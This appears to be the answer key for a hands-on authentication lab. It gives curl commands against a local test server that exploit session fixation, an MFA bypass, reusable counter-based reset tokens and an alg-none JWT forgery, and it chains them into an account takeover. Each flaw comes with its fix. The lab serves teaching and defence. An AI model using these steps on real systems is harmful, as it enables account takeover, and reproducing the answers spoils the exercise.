# Auth lab answers

## 1. Session fixation

```bash
curl -i -H 'Cookie: sid=attacker-chosen' 'http://127.0.0.1:8101/login?user=alice'
curl -s -H 'Cookie: sid=attacker-chosen' 'http://127.0.0.1:8101/session'
```

The id is reused and the session now belongs to alice. Fix it with a new id at login and a delete of the old one.

## 2. MFA skip

```bash
curl -s 'http://127.0.0.1:8101/mfa/login?user=alice'
curl -s -b 'sid=fixed-alice' 'http://127.0.0.1:8101/api/profile'
```

`/api/profile` reads the session and ignores the `mfa` flag. Fix it with a server side `mfa_ok` gate or a scoped token.

## 3. Reset token

```bash
curl -s 'http://127.0.0.1:8101/reset?user=alice'
curl -s 'http://127.0.0.1:8101/reset?user=alice'
curl -s 'http://127.0.0.1:8101/reset/confirm?user=alice&token=1002&password=x'
curl -s 'http://127.0.0.1:8101/reset/confirm?user=alice&token=1002&password=y'
```

The token is a counter and it is not consumed. Fix it with a random token, a hash at rest, one use and an expiry.

## 4. JWT none

```bash
JWT=$(curl -s 'http://127.0.0.1:8101/token?user=alice')
HEADER=$(cut -d. -f1 <<<"$JWT")
PAYLOAD=$(printf '{"sub":"alice","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=\n')
curl -s -H "Authorization: Bearer $HEADER.$PAYLOAD." 'http://127.0.0.1:8101/admin'
```

The verifier reads the header and checks the payload without a signature. Fix it with a pinned algorithm and a key.

## 5. Session leak

`/session` returns `user`, `mfa` and the raw `sid`. A real app would not return the raw id or the internal MFA flag.

## 6. Fixes

- Rotate the session id at login.
- Store the MFA state server side and gate the API.
- Random token, hash at rest, single use, short expiry.
- Pin the JWT algorithm and verify the signature.

## 7. Chain

Plant a fixed id, send the login link to the victim, skip MFA on the API and read the profile. The victim login uses the attacker id, so the attacker session is authenticated.

## Stretch notes

A state parameter needs a per flow random value stored with the session and compared at the callback. A signed JWT with HMAC is vulnerable to algorithm confusion only when the verifier trusts the header and uses the public key as the secret.
